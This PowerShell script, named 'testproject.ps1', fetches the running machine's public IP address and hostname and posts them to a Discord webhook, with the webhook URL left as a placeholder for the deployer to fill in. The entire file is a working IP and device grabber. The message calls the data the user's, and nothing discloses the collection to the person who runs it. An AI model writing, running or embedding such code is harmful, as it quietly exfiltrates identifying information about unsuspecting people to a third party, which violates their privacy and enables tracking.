# testproject.ps1

function SendToWebhook($webhookURL, $message) {
    $body = @{
        content = $message
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message. Error: $_"
    }
}

try {
    $ipResponse = Invoke-RestMethod -Uri 'https://api64.ipify.org?format=json'
    $ip = $ipResponse.ip
} catch {
    Write-Host "Failed to retrieve public IP. Aborting."
    exit 1
}

$deviceName = hostname
$webhookURL = 'PUT YOUR DISCORD WEBHOOK URL HERE'
$message = "User's IP: $ip`nDevice Name: $deviceName"

SendToWebhook $webhookURL $message
